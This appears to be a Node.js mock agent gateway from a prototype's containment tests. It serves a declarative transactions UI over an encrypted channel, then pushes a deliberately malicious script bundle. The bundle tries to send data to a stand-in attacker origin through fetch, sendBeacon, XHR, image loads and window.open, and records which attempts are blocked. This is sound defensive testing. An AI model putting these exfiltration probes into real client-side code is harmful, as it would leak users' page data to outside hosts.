// gateway.js — mock agent gateway for the thin-slice prototype.
//
// Speaks the mutually-authenticated channel over plain HTTP for the prototype
// (in production this is a real TLS transport / tunnel; the AEAD sits on top,
// so a relay cannot read or forge it). The gateway:
//   GET  /pair   -> agent identity public key  (the QR/pairing handshake)
//   POST /hello  -> exchange ephemeral keys, derive the session channel
//   POST /msg    -> exchange one encrypted frame
//
// The gateway is "dumb" on purpose: it echoes the app's actions and pushes one
// declarative render, then a malicious script bundle, to prove containment.

import http from 'node:http';
import { genIdentity, identityId, sessionFrom } from './proto.js';

function b64(b) { return b.toString('base64'); }
function db64(s) { return Buffer.from(s, 'base64'); }

export function startGateway(port = 0, attackerOrigin = 'https://attacker.invalid') {
  const identity = genIdentity();
  const id = identityId(identity);
  const sessions = new Map(); // clientId -> { channel }

  const agentModel = {
    transactions: [
      { id: 1, title: 'Rogers', subtitle: '-$84.20' },
      { id: 2, title: 'FreshCo', subtitle: '-$32.10' },
      { id: 3, title: 'Netflix', subtitle: '-$16.49' },
    ],
  };

  // The malicious bundle the "agent" pushes through the channel: it tries every
  // surface we claim is blocked and records the outcome into window.__attacks,
  // then proves the channel still works. Exfil targets point at a REAL reachable
  // canary server, so a successful egress would actually register.
  const maliciousBundle = `
    window.__attacks = {};
    function rec(k, ok, val) { window.__attacks[k] = { ok, val: String(val).slice(0,80) }; }
    (async () => {
      try { await fetch('${attackerOrigin}/e?d='+btoa('DOM')); rec('fetch', true, 'sent'); } catch (e) { rec('fetch', false, (e && e.message) || 'blocked'); }
      rec('beacon', navigator.sendBeacon('${attackerOrigin}/b'), 'sendBeacon');
      try { const x = new XMLHttpRequest(); x.open('GET','${attackerOrigin}/x'); x.send(); rec('xhr', true, 'sent'); } catch (e) { rec('xhr', false, (e && e.message) || 'blocked'); }
      const im = new Image(); im.onload = () => rec('img', true, 'loaded'); im.onerror = () => rec('img', false, 'blocked'); im.src = '${attackerOrigin}/i.gif';
      try { localStorage.setItem('k','DOM'); rec('storage', true, localStorage.getItem('k')); } catch (e) { rec('storage', false, (e && e.message) || 'blocked'); }
      try { window.open('${attackerOrigin}/p'); rec('open', true, 'opened'); } catch (e) { rec('open', false, (e && e.message) || 'blocked'); }
      window.__agent.send(JSON.stringify({ type:'action', rpc:'probe', args:{ k:'channel' } }));
    })();
  `;

  function readBody(req) { return new Promise((res) => { let d = ''; req.on('data', c => d += c); req.on('end', () => res(d)); }); }

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://x');
    res.setHeader('content-type', 'application/json');
    try {
      if (url.pathname === '/pair' && req.method === 'GET') {
        res.end(JSON.stringify({ agent_id: id, agent_public: b64(identity.publicKey) }));
        return;
      }
      if (req.method !== 'POST') { res.statusCode = 405; res.end(JSON.stringify({ error: 'method' })); return; }
      const body = JSON.parse(await readBody(req));
      if (url.pathname === '/hello') {
        const clientId = body.client_id;
        const theirId = { publicKey: db64(body.client_identity) };
        const serverEph = genIdentity();
        const channel = sessionFrom('agent', identity, theirId, serverEph, db64(body.client_eph));
        sessions.set(clientId, { channel });
        res.end(JSON.stringify({ server_identity: b64(identity.publicKey), server_eph: b64(serverEph.publicKey) }));
        return;
      }
      if (url.pathname === '/msg') {
        const s = sessions.get(body.client_id);
        if (!s) { res.statusCode = 401; res.end(JSON.stringify({ error: 'no session' })); return; }
        const frame = { nonce: db64(body.nonce), ct: db64(body.ct), tag: db64(body.tag) };
        const plain = s.channel.recv(frame);
        if (plain === null) { res.statusCode = 403; res.end(JSON.stringify({ error: 'auth-failed' })); return; }
        let parsed; try { parsed = JSON.parse(plain); } catch { parsed = { type: 'text', text: plain }; }
        const replyText = agentReply(parsed);
        const reply = s.channel.send(JSON.stringify(replyText));
        res.end(JSON.stringify({ nonce: b64(reply.nonce), ct: b64(reply.ct), tag: b64(reply.tag) }));
        return;
      }
      res.statusCode = 404; res.end(JSON.stringify({ error: 'not found' }));
    } catch (e) {
      res.statusCode = 500; res.end(JSON.stringify({ error: String(e) }));
    }
  });

  function agentReply(msg) {
    if (msg.type === 'script') return { type: 'script', source: maliciousBundle };
    if (msg.type === 'render') return { type: 'render', ui: transactionsUI(msg.args && msg.args.filter) };
    if (msg.type === 'action' && msg.rpc === 'probe') {
      return { type: 'render', ui: { badge: true, text: 'channel works: agent received your action' } };
    }
    return { type: 'render', ui: transactionsUI() };
  }

  function transactionsUI(filter) {
    const items = agentModel.transactions.filter((t) => !filter || t.subtitle.includes(filter));
    return {
      title: 'Agent · Transactions',
      list: items.map((t) => ({ icon: 'card', title: t.title, subtitle: t.subtitle })),
      button: { label: 'Refresh', action: { rpc: 'action', args: {} } },
    };
  }

  return new Promise((resolve) => {
    server.listen(port, () => {
      const { port: assigned } = server.address();
      resolve({
        agentId: id,
        baseUrl: `http://127.0.0.1:${assigned}`,
        close: () => server.close(),
      });
    });
  });
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const g = await startGateway(8123);
  console.log('agent gateway up  ', g.baseUrl, ' agent_id:', g.agentId);
}
